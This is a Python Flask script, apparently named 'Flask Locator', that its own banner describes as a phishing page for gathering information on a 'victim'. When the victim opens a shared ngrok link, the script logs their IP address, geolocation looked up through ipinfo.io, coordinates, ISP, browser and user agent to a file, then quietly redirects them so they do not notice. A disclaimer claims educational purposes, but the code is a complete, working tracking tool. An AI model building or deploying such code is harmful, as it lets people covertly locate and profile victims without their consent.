import sys
import os
import logging
import requests
import json


from flask import Flask
from flask import request as r
from flask import render_template
from flask import jsonify
from flask_ngrok import run_with_ngrok



port_ = 80
temp_ip_address_ = []
uniqe_ips = []
app = Flask(__name__)
run_with_ngrok(app)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

if sys.platform.lower() == "win32":
    os.system('color')

class style():
    BLACK = lambda x: '\033[30m' + str(x)
    RED = lambda x: '\033[31m' + str(x)
    GREEN = lambda x: '\033[32m' + str(x)
    YELLOW = lambda x: '\033[33m' + str(x)
    BLUE = lambda x: '\033[34m' + str(x)
    CYAN = lambda x: '\033[36m' + str(x)
    WHITE = lambda x: '\033[37m' + str(x)
    UNDERLINE = lambda x: '\033[4m' + str(x)
    RESET = lambda x: '\033[0m' + str(x)

def clear():
    print (u"{}[2J{}[;H".format(chr(27), chr(27)))



def banner():
    print(style.RESET('''

  ______ _           _    _                     _
 |  ____| |         | |  | |                   | |
 | |__  | | __ _ ___| | _| |     ___   ___ __ _| |_ ___  _ __
 |  __| | |/ _` / __| |/ / |    / _ \ / __/ _` | __/ _ \| '__|
 | |    | | (_| \__ \   <| |___| (_) | (_| (_| | || (_) | |
 |_|    |_|\__,_|___/_|\_\______\___/ \___\__,_|\__\___/|_|

   ::: Coded by  : @pr0xy07
   ::: Contact me: pr0xy07@tutanota.com
''' + "\n" + style.GREEN("")))

    print(style.YELLOW(
    '''
        [+]Flask Locator is a simple phishing page that
        will get you back information about your victim
        when they access it such as IP address, location,
        device platform, etc...

       [+]It works by hosting a Flask website on your local network
        so you can easily access it by typing <local_ip>:80 in the
        web-browser, so you can download ngrok (Instructions shown
        in the github discription), and host the website on the WAN
        network so anybody in the world can access it by you sending
        them the link shown when running ngrokServer.py script after
        they have accessed the link they will be redirected to your
        own website of choice in seconds without them noticing the
        phishing page.

       [+]For more info you can contact me at pr0xy07@tutanota.com''' + style. RED('''
       [+]THIS APPLICATION IS FOR EDUCATION PURPOSES ONLY!
       '''
       ) + "\n" + style.RESET("")))



@app.route('/')
def index():
    return render_template('main.html', value = redirect)

@app.route('/', methods=['POST'])
def get_ip():
    data = r.get_json()
    ip_ = data['ip']

    temp_ip_address_.append(ip_)
    for elem in temp_ip_address_:
        if elem not in uniqe_ips:
            uniqe_ips.append(elem)

    for ip in uniqe_ips:
        req = requests.get('https://ipinfo.io/{}/json'.format(ip))
        resp_json = json.loads(req.text)
        print(style.GREEN("\n[+]") + style.CYAN("New device detected:") + style.RESET(""))
        print("Device IP: {}".format(ip_))
        print("Device Country: {}".format(resp_json['country'].title()))
        print("Device Region: {}".format(resp_json['region'].title()))
        print("Device City Location: {}".format(resp_json['city'].title()))
        print("Device Platform: {}".format(r.user_agent.platform.title()))
        print("Device Browser: {}".format(r.user_agent.browser.title()))
        print("Browser Version: {}".format(r.user_agent.version.title()))
        print("Device Location: {}".format(resp_json['loc']))
        print("Device Timezone: {}".format(resp_json['timezone']))
        print("Service Provider: {}".format(resp_json['org']))
        print("User Agent: {}".format(r.headers.get('User-Agent')))

        f = open("log.txt", 'a')
        f.write("\nDevice IP: {}\n".format(ip_))
        f.write("Device Country: {}\n".format(resp_json['country'].title()))
        f.write("Device Region: {}\n".format(resp_json['region'].title()))
        f.write("Device City Location: {}\n".format(resp_json['city'].title()))
        f.write("Device Platform: {}\n".format(r.user_agent.platform.title()))
        f.write("Device Browser: {}\n".format(r.user_agent.browser.title()))
        f.write("Browser Version: {}".format(r.user_agent.version.title()))
        f.write("Device Location: {}\n".format(resp_json['loc']))
        f.write("Service Provider: {}\n".format(resp_json['org']))
        f.write("User Agent: {}\n".format(r.headers.get('User-Agent')))
        f.write("-" * 50)
        print(style.GREEN('[+]Saved to log.txt'))

    return jsonify(status="success", data=data)

if __name__ == '__main__':
    try:
        clear()
        banner()
        redirect = str(input(style.GREEN("[+]") + style.RESET("Please enter website to redirect to (Default: www.google.com):")))
        print("\n")
        if redirect == "" :
            redirect = "www.google.com"
        app.run()
    except KeyboardInterrupt:
        clear()
        banner()
        print("Contact me: pr0xy07@tutanota.com")
        print("[+]Goodbye!")
